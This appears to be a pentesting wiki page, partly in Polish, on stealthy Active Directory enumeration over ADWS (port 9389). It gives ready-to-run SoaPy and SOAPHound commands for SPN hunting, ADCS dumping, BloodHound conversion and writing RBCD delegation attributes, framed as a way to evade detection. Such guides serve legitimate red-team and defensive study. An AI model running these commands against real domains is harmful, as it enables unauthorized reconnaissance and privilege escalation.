# Active Directory Web Services (ADWS) Enumeration & Stealth Collection

{{#include ../../banners/hacktricks-training.md}}

## What is ADWS?

Active Directory Web Services (ADWS) jest **włączony domyślnie na każdym Domain Controller od Windows Server 2008 R2** i nasłuchuje na TCP **9389**. Pomimo nazwy, **nie jest używany HTTP**. Zamiast tego usługa udostępnia dane w stylu LDAP przez stos własnościowych protokołów .NET do ramkowania:

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Ponieważ ruch jest enkapsulowany w tych binarnych ramkach SOAP i przechodzi przez rzadko używany port, **enumeration przez ADWS jest znacznie mniej narażony na inspekcję, filtrowanie czy wykrywanie sygnaturami niż klasyczny ruch LDAP/389 & 636**. Dla operatorów oznacza to:

* Bardziej ukryte rozpoznanie – Blue teams często koncentrują się na zapytaniach LDAP.
* Możliwość zbierania z hostów niebędących Windows (Linux, macOS) przez tunelowanie 9389/TCP przez SOCKS proxy.
* Te same dane, które uzyskałbyś przez LDAP (users, groups, ACLs, schema itp.) oraz możliwość wykonania zapisu (np. `msDs-AllowedToActOnBehalfOfOtherIdentity` dla RBCD).

Interakcje ADWS są realizowane przez WS-Enumeration: każde zapytanie zaczyna się od wiadomości `Enumerate`, która definiuje filtr/atrybuty LDAP i zwraca `EnumerationContext` GUID, a następnie następuje jedna lub więcej wiadomości `Pull`, które strumieniują wyniki do rozmiaru okna zdefiniowanego przez serwer. Konteksty wygasają po ~30 minutach, więc narzędzia muszą albo stronicować wyniki, albo dzielić filtry (zapytania prefiksowe po CN), aby nie utracić stanu. Przy pobieraniu security descriptors, określ kontrolę `LDAP_SERVER_SD_FLAGS_OID`, aby pominąć SACLs, w przeciwnym razie ADWS po prostu usuwa atrybut `nTSecurityDescriptor` z odpowiedzi SOAP.

> NOTE: ADWS jest także używany przez wiele narzędzi RSAT GUI/PowerShell, więc ruch może zlewać się z legalną aktywnością adminów.

## SoaPy – Native Python Client

[SoaPy](https://github.com/logangoins/soapy) to **pełna reimplementacja stosu protokołów ADWS w czystym Pythonie**. Konstruuje ramki NBFX/NBFSE/NNS/NMF bajt po bajcie, co pozwala na zbieranie z systemów Unix-like bez uruchamiania środowiska .NET.

### Key Features

* Wsparcie dla **proxy przez SOCKS** (przydatne z implantów C2).
* Dokładne filtry wyszukiwania identyczne z LDAP `-q '(objectClass=user)'`.
* Opcjonalne operacje **zapisu** ( `--set` / `--delete` ).
* Tryb wyjścia **BOFHound** do bezpośredniego importu do BloodHound.
* Flaga `--parse` do upiększania timestampów / `userAccountControl` gdy wymagana jest czytelność dla człowieka.

### Targeted collection flags & write operations

SoaPy zawiera dobrane przełączniki, które odtwarzają najczęstsze zadania związane z polowaniem LDAP przez ADWS: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, oraz surowe `--query` / `--filter` do niestandardowych pobrań. Połącz to z prymitywami zapisu takimi jak `--rbcd <source>` (ustawia `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (SPN staging dla ukierunkowanego Kerberoasting) oraz `--asrep` (przełącza `DONT_REQ_PREAUTH` w `userAccountControl`).

Example targeted SPN hunt that only returns `samAccountName` and `servicePrincipalName`:
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
Użyj tego samego hosta/poświadczeń, aby natychmiast wykorzystać ustalenia: wyeksportuj obiekty obsługujące RBCD przy użyciu `--rbcds`, a następnie zastosuj `--rbcd 'WEBSRV01$' --account 'FILE01$'`, aby przygotować łańcuch Resource-Based Constrained Delegation (zobacz [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) dla pełnej ścieżki nadużycia).

### Instalacja (host operatora)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## SOAPHound – Zbieranie ADWS o dużej skali (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) jest kolektorem .NET, który utrzymuje wszystkie interakcje LDAP wewnątrz ADWS i generuje JSON zgodny z BloodHound v4. Buduje jednorazowo kompletny cache `objectSid`, `objectGUID`, `distinguishedName` i `objectClass` (`--buildcache`), a następnie ponownie go używa do wysokonakładowych przebiegów `--bhdump`, `--certdump` (ADCS) lub `--dnsdump` (AD-integrated DNS), dzięki czemu tylko ~35 krytycznych atrybutów opuszcza DC. AutoSplit (`--autosplit --threshold <N>`) automatycznie dzieli zapytania według prefiksu CN, aby zmieścić się w 30-minutowym limicie EnumerationContext w dużych lasach.

Typowy przebieg pracy na maszynie wirtualnej operatora dołączonej do domeny:
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
Wyeksportowane sloty JSON bezpośrednio do workflowów SharpHound/BloodHound — zobacz [BloodHound methodology](bloodhound.md) dla pomysłów dotyczących dalszego tworzenia grafów.

AutoSplit sprawia, że SOAPHound jest odporny w lasach zawierających miliony obiektów, jednocześnie utrzymując liczbę zapytań niższą niż w snapshotach w stylu ADExplorer.

## Ukryty proces zbierania danych AD

Poniższy workflow pokazuje, jak enumerować **obiekty domeny i ADCS** przez ADWS, konwertować je do BloodHound JSON i polować na ścieżki ataku oparte na certyfikatach – wszystko z Linuxa:

1. **Tunnel 9389/TCP** z sieci docelowej do twojej maszyny (np. przez Chisel, Meterpreter, SSH dynamic port-forward itp.). Eksportuj `export HTTPS_PROXY=socks5://127.0.0.1:1080` lub użyj SoaPy’s `--proxyHost/--proxyPort`.

2. **Zbierz obiekt domeny root:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Zbierz obiekty związane z ADCS z Configuration NC:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **Konwertuj na BloodHound:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **Prześlij plik ZIP** w BloodHound GUI i uruchom zapytania cypher takie jak `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c`, aby ujawnić ścieżki eskalacji certyfikatów (ESC1, ESC8, itd.).

### Zapisywanie `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
Połącz to z `s4u2proxy`/`Rubeus /getticket`, aby uzyskać pełny łańcuch **Resource-Based Constrained Delegation** (zobacz [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

## Podsumowanie narzędzi

| Cel | Narzędzie | Uwagi |
|---------|------|-------|
| Enumeracja ADWS | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, odczyt/zapis |
| Masowy zrzut ADWS | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, tryby BH/ADCS/DNS |
| Import do BloodHound | [BOFHound](https://github.com/bohops/BOFHound) | Konwertuje logi SoaPy/ldapsearch |
| Kompromitacja certyfikatów | [Certipy](https://github.com/ly4k/Certipy) | Może być przekierowany przez ten sam SOCKS |

## Źródła

* [SpecterOps – Make Sure to Use SOAP(y) – An Operators Guide to Stealthy AD Collection Using ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
* [IBM X-Force Red – Stealthy Enumeration of Active Directory Environments Through ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
* [FalconForce – SOAPHound tool to collect Active Directory data via ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)

{{#include ../../banners/hacktricks-training.md}}
